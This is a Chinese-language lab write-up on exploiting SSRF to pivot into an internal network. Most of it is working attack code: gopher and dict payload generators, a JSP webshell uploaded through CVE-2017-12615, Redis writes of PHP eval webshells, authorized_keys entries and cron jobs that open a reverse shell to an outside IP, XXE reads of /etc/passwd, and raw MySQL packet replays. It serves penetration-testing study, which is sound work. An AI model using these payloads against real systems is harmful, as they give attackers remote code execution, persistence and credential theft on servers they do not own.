## 查找内网存活主机
1. **首先**可以试着用file://伪协议读取一点东西
    - `/etc/passwd`读取文件passwd
    - `/etc/hosts`显示当前操作系统网卡ip
    - `/proc/net/arp`显示arp缓存表（寻找内网其他主机）
    - `/proc/net/fib_trie`显示当前网段路由信息
2. 读取`/etc/passwd`试一下，`file:///etc/passwd`读取成功。
3. 接下来查这台主机所处的内网网段是多少，读取`file:///etc/hosts`可以看到有一张处于172.72.23.网段的网卡，这应该就是内网网段了。用bp爆破1-254可以看到21-28有内容。
4. 再端口爆破![](/image/270.png)发现这些`ip:端口`是有内容的。就找到了内网存活主机。
5. 用file查内网存活主机ip，用dict查开放端口，
## 信息收集dict伪协议
看到`172.72.23.27:6379`是存活的，可以用dict看一下信息
`dict://172.72.23.27:6379/info`
![](/image/271.png)

## http目录扫描及命令执行
对`http://172.72.23.22/`进行目录爆破，发现一个shell.php的文件。就是普通的命令执行，可以直接get请求`http://172.72.23.22/shell.php?cmd=cat /flag`就可以得到flag。
发送get请求也可以gopher伪协议，
利用脚本
```python
import urllib.parse  
  
test=\  
"""GET /shell.php?cmd=env HTTP/1.1  
Host: 172.72.23.22  
"""  
#后面一定要有回车，回车表示http请求结束。  
tmp = urllib.parse.quote(test)  
new = tmp.replace("%0A","%0D%0A")  
result = 'gopher://127.0.0.1:80/_'+urllib.parse.quote(new)  
print(result)
```
出payload。
## sql注入
`http://172.72.23.23`的80端口有一个sql注入题目。这一关可以直接用get请求，思路就是正常的sql注入，也可以用gopher伪协议发送get请求。
但是那个二次编码的内容要用用bp发送，不然报错400，就像这样![](/image/272.png)发送成功。
## 命令执行
`http://172.72.23.24`是一个ping码的网页，存在命令执行。
这就要用gopher伪协议发送post请求了。
用脚本
```python
import urllib.parse  
  
test=\  
"""POST /ping.php HTTP/1.1  
Host: 172.72.23.24  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 20  
  
target=127.0.0.1;env  
"""  
#后面一定要有回车，回车表示http请求结束。  
tmp = urllib.parse.quote(test)  
new = tmp.replace("%0A","%0D%0A")  
result = 'gopher://172.72.23.24:80/_'+urllib.parse.quote(new)  
print(result)
```
直接生成pyalod
## XXE
`http://172.72.23.25`存在XXE漏洞，看源码里有
```
var data = "<user><username>" + username + "</username><password>" + password + "</password></user>";
```
用的是post请求。
脚本
```python
import urllib.parse  
  
test=\  
"""POST /index.php HTTP/1.1  
Host: 172.72.23.25  
Content-Type: application/xml;charset=utf-8  
Content-Length: 123  
  
<!DOCTYPE root[<!ENTITY niu SYSTEM "file:///etc/passwd">]><user><username>&niu;</username><password>admin</password></user>  
"""  
#后面一定要有回车，回车表示http请求结束。  
tmp = urllib.parse.quote(test)  
new = tmp.replace("%0A","%0D%0A")  
result = 'gopher://172.72.23.25:80/_'+urllib.parse.quote(new)  
print(result)
```
得到payload
## Tomcat
`http://172.72.23.26`的8080端口。
这个涉及到CVE-2017-12615
配置文件readonly=false会导致漏洞
根据设计，Apache Tomcat 服务器不允许通过 PUT 方法上传 JSP 文件。这很可能是为了防止攻击者上传 JSP shell 并远程执行服务器上的代码而采取的安全措施。然而，由于安全检查不足，攻击者可以通过精心构造的 HTTP 请求，在启用了 PUT 功能的 Tomcat 7.0 到 79 版本服务器上，利用 PUT 方法远程执行代码。
要构造一个put请求
用脚本生成
```python
import urllib.parse  
  
test=\  
"""PUT /777.jsp/ HTTP/1.1  
Host: 172.72.23.26:8080  
Accept: */*  
Accept-Language: en  
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)  
Connection: close  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 5  
  
shell  
"""  
#后面一定要有回车，回车表示http请求结束。  
tmp = urllib.parse.quote(test)  
new = tmp.replace("%0A","%0D%0A")  
result = 'gopher://172.72.23.26:8080/_'+urllib.parse.quote(new)  
print(result)
```
发送后回显201就是写入成功了，再访问/777.jsp，就可以看到内容，但是要想写入木马，就得
```python
import urllib.parse  
  
test=\  
"""PUT /888.jsp/ HTTP/1.1  
Host: 172.72.23.26:8080  
Accept: */*  
Accept-Language: en  
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)  
Connection: close  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 462  
  
<%  
    String command = request.getParameter("cmd");    if(command != null)    {        java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream();        int a = -1;        byte[] b = new byte[2048];        out.print("<pre>");        while((a=in.read(b))!=-1)        {            out.println(new String(b));        }        out.print("</pre>");    } else {        out.print("format: xxx.jsp?cmd=Command");    }%>  
"""  
#后面一定要有回车，回车表示http请求结束。  
tmp = urllib.parse.quote(test)  
new = tmp.replace("%0A","%0D%0A")  
result = 'gopher://172.72.23.26:8080/_'+urllib.parse.quote(new)  
print(result)
```
得到payload,发送后就成功注入木马，再`url=http://172.72.23.26:8080/888.jsp?cmd=env`就可以命令执行了。
## redis未授权写入webshell
内网的 172.72.23.27 主机上的 6379 端口运行着未授权的 Redis 服务，系统没有 Web 服务（无法写 Shell），无 SSH 公私钥认证（无法写公钥），所以这里攻击思路只能是使用定时任务来进行攻击了。常规的攻击思路的主要命令如下：
先通过`docker exec -it 540df3c381f6 bash`进入对应主机的控制台，再`redis-cli -h 172.72.23.27`进入redis-cli界面。
```bash
#清空key
flushall
#设置要操作的路径为定时任务目录（一般为网页根目录）
config set dir /var/spool/cron/
# 设置文件名
config set dbfilename phpinfo.php
#写入木马
set payload "<?php phpinfo();?>"
# 设置定时任务内容(反弹shell)
set x "\n* * * * * /bin/bash -i >%26 /dev/tcp/121.89.81.39/2333 0>%261\n"
#保存操作
save
```
这样就会写入成功。
但是我们攻击环境下不可以用`redis-cli`，但可以用dict和gopher伪协议，用gopher伪协议十分复杂，可以先用dict。
/var/spool/cron/是 Linux 系统默认的 crontab 配置文件存放目录，每个用户的定时任务都会以**用户名**为文件名保存在这里（比如 root 用户的任务文件是 `/var/spool/cron/root`）；写入这个目录的 cron 文件会被 cron 服务自动加载，定时执行里面的命令。
格式如下
```bash
dict://x.x.x.x:6379/<Redis 命令>
```
下面开始直接使用 dict 协议操作。
```bash
# 清空 key
dict://172.72.23.27:6379/flushall

# 设置要操作的路径为定时任务目录
dict://172.72.23.27:6379/config set dir /var/spool/cron/

# 在定时任务目录下创建 root 的定时任务文件
dict://172.72.23.27:6379/config set dbfilename phpinfo.php

# 写入 Bash 反弹 shell 的 payload
dict://172.72.23.27:6379/set payload "<?php@eval(POST_['cmd']);phpinfo();?>"

# 保存上述操作
dict://172.72.23.27:6379/save
```
SSRF 传递的时候记得要把 `&` URL 编码为 `%26`，上面的操作最好再 BP 下抓包操作，防止浏览器传输的时候被 URL 打乱编码
这样就可以成功
也可以用gopher伪协议。
这个可以用一个脚本把他转换为gopher伪协议的形式（抄别人的，用的是python2）
```python
import urllib  
protocol="gopher://"  
ip="172.72.23.27"  
port="6379"  
shell="\n\n<?php eval($_POST[\"cmd\"]);?>\n\n"  
filename="shell6.php"  
path="/var/www/html"  
passwd=""  
cmd=["flushall",  
     "set 1 {}".format(shell.replace(" ","${IFS}")),  
     "config set dir {}".format(path),  
     "config set dbfilename {}".format(filename),  
     "save"  
     ]  
if passwd:  
    cmd.insert(0,"AUTH {}".format(passwd))  
payload=protocol+ip+":"+port+"/_"  
def redis_format(arr):  
    CRLF="\r\n"  
    redis_arr = arr.split(" ")  
    cmd=""  
    cmd+="*"+str(len(redis_arr))  
    for x in redis_arr:  
       cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")  
    cmd+=CRLF  
    return cmd  
  
if __name__=="__main__":  
    for x in cmd:  
       payload += urllib.quote(redis_format(x))  
        payload = urllib.quote(payload)  
    print payload
```
这样就可以成功写入。![](/image/273.png)
也可以用这个脚本构造反弹shell,创建计划任务。**这个只能在Centos上使用，别的不行，好像是由于权限的问题。**
```python
import urllib  
protocol="gopher://"  
ip="172.72.23.27"  
port="6379"  
reverse_ip="121.89.81.39"  
reverse_port="2333"  
cron="\n\n\n\n*/1 * * * * bash -i >& /dev/tcp/%s/%s 0>&1\n\n\n\n"%(reverse_ip,reverse_port)  
filename="root"  
path="/var/spool/cron"  
passwd=""  
cmd=["flushall",  
     "set 1 {}".format(cron.replace(" ","${IFS}")),  
     "config set dir {}".format(path),  
     "config set dbfilename {}".format(filename),  
     "save"  
     ]  
if passwd:  
    cmd.insert(0,"AUTH {}".format(passwd))  
payload=protocol+ip+":"+port+"/_"  
def redis_format(arr):  
    CRLF="\r\n"  
    redis_arr = arr.split(" ")  
    cmd=""  
    cmd+="*"+str(len(redis_arr))  
    for x in redis_arr:  
       cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")  
    cmd+=CRLF  
    return cmd  
  
if __name__=="__main__":  
    for x in cmd:  
       payload += urllib.quote(redis_format(x))  
        payload = urllib.quote(payload)  
    print payload
```
提交后就会得到反弹的shell![](/image/274.png)
## redis未授权写SSH公钥
系统没有 Web 服务（无法写 Shell），无 SSH 公私钥认证（无法写公钥），但是我抄了一下大佬的博客，看怎么写SSH公钥。
同样，我们也可以直接这个存在Redis未授权的主机的~/.ssh目录下写入SSH公钥，直接实现免密登录，但前提是~/.ssh目录存在，如果不存在我们可以写入计划任务来创建该目录。
用脚本生成payload
```python
import urllib  
protocol="gopher://"  
ip="192.168.52.131"  
port="6379"  
ssh_pub="\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami\n\n"  
filename="authorized_keys"  
path="/root/.ssh/"  
passwd=""  
cmd=["flushall",  
     "set 1 {}".format(ssh_pub.replace(" ","${IFS}")),  
     "config set dir {}".format(path),  
     "config set dbfilename {}".format(filename),  
     "save"  
     ]  
if passwd:  
    cmd.insert(0,"AUTH {}".format(passwd))  
payload=protocol+ip+":"+port+"/_"  
def redis_format(arr):  
    CRLF="\r\n"  
    redis_arr = arr.split(" ")  
    cmd=""  
    cmd+="*"+str(len(redis_arr))  
    for x in redis_arr:  
       cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")  
    cmd+=CRLF  
    return cmd  
  
if __name__=="__main__":  
    for x in cmd:  
       payload += urllib.quote(redis_format(x))  
        payload = urllib.quote(payload)  
    print payload
```
一旦写入成功，就可以`ssh root@目标IP`免密登入目标服务器。
其中公钥可以再本地生成`ssh-keygen -t rsa`保存在`~/.ssh`目录下。
```
~/.ssh/id_rsa        # 私钥
~/.ssh/id_rsa.pub    # 公钥
```
原理就是，服务器会验证，你有没有对应的**私钥**，而我这边是否存着匹配的**公钥**
私钥签名的数据，只能用对应的公钥验证，但是公钥无法推导出私钥。
我本地生成的公钥私钥是天然配对的。如果我的私钥和服务器的公钥是配对的，就可以免密登录。但是肯定不配对，就需要在服务器写入自己的公钥。这样就配对了。
SSH 使用的是 **非对称加密（密钥对）**：
- 🔑 **私钥（id_rsa）**：只在你自己电脑上
- 🔓 **公钥（id_rsa.pub）**：放在服务器的
    `~/.ssh/authorized_keys`
1. 用命令：
	`ssh root@目标IP`
2. 客户端用我的 **私钥** 对一段数据进行签名
3. 服务器读取：
    `/root/.ssh/authorized_keys`
4. 服务器用里面的 **公钥** 验证签名
5. **匹配成功 → 直接放行 → 不需要密码**
所以：  
**“免密”的本质不是没有认证，而是用“密钥”代替“密码”。**
但是我通过SSRF强行写入我自己的公钥，就相当于我已经把钥匙插在钥匙孔了，登录自然就不需要密码了。
## redis授权
`http://172.72.23.28` 该 172.72.23.28 主机运行着 Redis 服务，但是有密码验证，无法直接未授权执行命令![](/image/275.png)
但是除了6379端口，还开了80端口，存在一个明显的文件包含漏洞。这样就可以读取一些配置文件。
读取 redis 的配置文件信息，Redis 常见的配置文件路径如下：
```payload
/etc/redis.conf
/etc/redis/redis.conf
/usr/local/redis/etc/redis.conf
/opt/redis/ect/redis.conf
```
成功在`/etc/redis.conf`读取到文件，![](/image/276.png)
找到密码。
在用密码登录![](/image/277.png)
拿到密码的话就可以正常和 Redis 进行交互了，可以试一下dict伪协议
```
dict://172.72.23.28:6379/auth p@aaw0rd
```
可以认证成功，但是因为 dict 不支持多行命令的原因，这样就导致认证后的参数无法执行，所以 dict 协议理论上来说是没发攻击带认证的 Redis 服务的。
所以只可以用gopher伪协议。
gopher 协议因为需要原生数据包，所以我们需要抓取到 Redis 的请求数据包。可以使用 Linux 自带的 socat 命令来进行本地的模拟抓取：
```
socat -v tcp-listen:4444,fork tcp-connect:127.0.0.1:6379
redis-cli -h 127.0.0.1 -p 4444
127.0.0.1:4444>
```

```bash
# 认证 redis
127.0.0.1:4444> auth P@ssw0rd
OK

# 清空 key
127.0.0.1:4444> flushall

# 设置要操作的路径为网站根目录
127.0.0.1:4444> config set dir /var/www/html

# 在网站目录下创建 shell.php 文件
127.0.0.1:4444> config set dbfilename shell.php

# 设置 shell.php 的内容
127.0.0.1:4444> set x "\n<?php eval($_GET[1]);?>\n"

# 保存上述操作
127.0.0.1:4444> save
```
这样就可以在监听端口看到流量。![](/image/278.png)
去掉一些报错的再简化。就得到了完整的流量![](/image/279.png)
```
*2\r
$4\r
auth\r
$8\r
P@ssw0rd\r
*1\r
$8\r
flushall\r
*4\r
$6\r
config\r
$3\r
set\r
$3\r
dir\r
$13\r
/var/www/html\r
*4\r
$6\r
config\r
$3\r
set\r
$10\r
dbfilename\r
$9\r
shell.php\r
*3\r
$3\r
set\r
$1\r
x\r
$25\r

<?php eval($_GET[1]);?>
\r
*1\r
$4\r
save\r
```
可以看到每行都是以 `\r` 结尾的，但是 Redis 的协议是以 CRLF (`\r\n`) 结尾，所以转换的时候需要把 `\r` 转换为 `\r\n`，然后其他全部进行 两次 URL 编码，这里借助 BP 就很容易解决：
这里直接用刚才的脚本，先把所有的\r都去掉。
```python
import urllib.parse  
  
test=\  
"""*2  
$4  
auth  
$8  
P@ssw0rd  
*1  
$8  
flushall  
*4  
$6  
config  
$3  
set  
$3  
dir  
$13  
/var/www/html  
*4  
$6  
config  
$3  
set  
$10  
dbfilename  
$9  
shell.php  
*3  
$3  
set  
$1  
x  
$25  
  
<?php eval($_GET[1]);?>  
  
*1  
$4  
save  
"""  
#后面一定要有回车，回车表示http请求结束。  
tmp = urllib.parse.quote(test)  
new = tmp.replace("%0A","%0D%0A")  
result = 'gopher://172.72.23.28:6379/_'+urllib.parse.quote(new)  
print(result)
```
再`http://172.72.23.28:6379/shell.php?1=system(env);`就可以命令执行了。![](/image/280.png)
## MySQL未授权
适用于MySQL 空密码可以登录，靶场在数据库下和系统下各放了一个 flag，通过 SSRF 可以和数据库进行交互，SSRF 进行 UDF 提权可以拿到系统下的 flag：
![](/image/281.png)
MySQL 需要密码认证时，服务器先发送 salt 然后客户端使用 salt 加密密码然后验证；但是当无需密码认证时直接发送 TCP/IP 数据包即可。所以这种情况下是可以直接利用 SSRF 漏洞攻击 MySQL 的。因为使用 gopher 协议进行攻击需要原始的 MySQL 请求的 TCP 数据包，所以还是和攻击 Redis 应用一样，这里我们使用 tcpdump 来监听抓取 3306 的认证的原始数据包：
```bash
# lo 回环接口网卡 -w 报错 pcapng 数据包
tcpdump -i lo port 3306 -w mysql.pcapng
```
然后本地使用 MySQL 来执行一些测试命令：
```mysql
$ mysql -h127.0.0.1 -uroot -e "select * from flag.test union select user(),'www.sqlsec.com';"
+----------------+----------------------------------------+
| id             | flag                                   |
+----------------+----------------------------------------+
| 1              | flag{71***************************316} |
| root@127.0.0.1 | www.sqlsec.com                         |
+----------------+----------------------------------------+
```
中止 tcpdump 使用 Wireshark 打开 `mysql.pcapng` 数据包，追踪 TCP 流 然后过滤出发给 3306 的数据：
这里还不会用wireshark抓包，以后学一下，就先抄作者的包吧。
保存为原始数据「Show data as `Raw`」，并且整理成 1 行：
```payload
a100000185a23f0000000001080000000000000000000000000000000000000000000000726f6f7400006d7973716c5f6e61746976655f70617373776f72640064035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f706964033530380f5f636c69656e745f76657273696f6e06352e362e3531095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d697420313d0000000373656c656374202a2066726f6d20666c61672e7465737420756e696f6e2073656c656374207573657228292c277777772e73716c7365632e636f6d270100000001
```
用脚本（这是py3的脚本）
```python
import sys

def results(s):
    a=[s[i:i+2] for i in range(0,len(s),2)]
    return "curl gopher://127.0.0.1:3306/_%"+"%".join(a)

if __name__=="__main__":
    s=sys.argv[1]
    print(results(s))
```
![](/image/282.png)
这样就得到payload，再在本地curl一下
![](/image/283.png)

从图上可以看到 gopher 请求的数据包已经成功执行了，user () 和 数据库中的 flag 都可查询出来了。
如果 curl 请求提示是一个二进制文件无法直接显示，所可以使用 `--output` 来输出到文件中，然后手动 cat 文件同样也可以看到 gopher 协议交互 MySQL 的执行结果：
```bash
$ curl gopher://127.0.0.1:3306/_xxx --output mysql_result  
```
SSRF 攻击 MySQL 仅仅查询数据意义不大，不如直接 UDF 提权然后反弹 shell 出来更加直接，下面尝试使用 SSRF 来 UDF 提权内网的 MySQL 应用，
```bash
$ mysql -h127.0.0.1 -uroot -e "show variables like 
'%plugin%';"
```
tcpdump 监听，使用 Wirshark 分析导出原始数据：
使用脚本将原始数据转换 gopher 协议，得到的数据如下
```bash
curl gopher://127.0.0.1:3306/_%a2%00%00%01%85%a2%3f%00%00%00%00%01%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%65%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%04%33%35%35%34%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%36%2e%35%31%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%20%00%00%00%03%73%68%6f%77%20%76%61%72%69%61%62%6c%65%73%20%6c%69%6b%65%20%0a%27%25%70%6c%75%67%69%6e%25%27%01%00%00%00%01  
```
后面提权就看不懂了，以后有机会在学。
## FastCGI
FastCGI指快速通用网关接口（Fast Common Gateway Interface／FastCGI）是一种让交互程序与Web服务器通信的协议。FastCGI是早期通用网关接口（CGI）的增强版本。FastCGI致力于减少网页服务器与CGI程序之间交互的开销，从而使服务器可以同时处理更多的网页请求。
众所周知，在网站分类中存在一种分类就是静态网站和动态网站，两者的区别就是静态网站只需要**通过浏览器进行解析**，而动态网站需要一个**额外的编译解析**的过程。以Apache为例，当访问动态网站的主页时，根据容器的配置文件，它知道这个页面不是静态页面，Web容器就会把这个请求进行简单的处理，然后如果使用的是CGI，就会启动CGI程序（对应的就是PHP解释器）。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定CGI规定的格式返回处理后的结果，退出进程，Web server再把结果返回给浏览器。这就是一个完整的动态PHP Web访问流程。

这里说的是使用CGI，而FastCGI就相当于高性能的CGI，与CGI不同的是它**像一个常驻的CGI**，在启动后会一直运行着，不需要每次处理数据时都启动一次，**所以FastCGI的主要行为是将CGI解释器进程保持在内存中**，并因此获得较高的性能 。
### php-fpm
FPM（FastCGI 进程管理器）可以说是FastCGI的一个具体实现，用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。
攻击FastCGI的主要原理就是，在设置环境变量实际请求中会出现一个`SCRIPT_FILENAME': '/var/www/html/index.php`这样的键值对，它的意思是php-fpm会执行这个文件，但是这样即使能够控制这个键值对的值，但也只能控制php-fpm去执行某个已经存在的文件，不能够实现一些恶意代码的执行。

而在PHP 5.3.9后来的版本中，PHP增加了安全选项导致只能控制php-fpm执行一些php、php4这样的文件，这也增大了攻击的难度。但是好在PHP允许通过PHP_ADMIN_VALUE和PHP_VALUE去动态修改PHP的设置。

那么当设置PHP环境变量为：`auto_prepend_file = php://input;allow_url_include = On`时，就会在执行PHP脚本之前包含环境变量`auto_prepend_file`所指向的文件内容，`php://input`也就是接收POST的内容，这个我们可以在FastCGI协议的body控制为恶意代码，这样就在理论上实现了php-fpm任意代码执行的攻击。

### 攻击
假设在配置fpm时，将监听的地址设为了0.0.0.0:9000，那么就会产生php-fpm未授权访问漏洞，此时攻击者可以无需利用SSRF从服务器本地访问的特性，直接与服务器9000端口上的php-fpm进行通信，进而可以用fcgi_exp等工具去攻击服务器上的php-fpm实现任意代码执行。
这里要用到工具Gopherus,这是一个用python2写的工具。
直接用工具生成，
![](/image/284.png)
这样得到的payload再url编码一次，不用hackbar的url编码，可以用bp的对特殊字符编码。
发送payload就可以执行成功。











































## 参考文章
https://www.sqlsec.com/2021/05/ssrf.html#SSRF-%E4%B9%8B-CVE-2017-12615
https://www.freebuf.com/articles/web/260806.html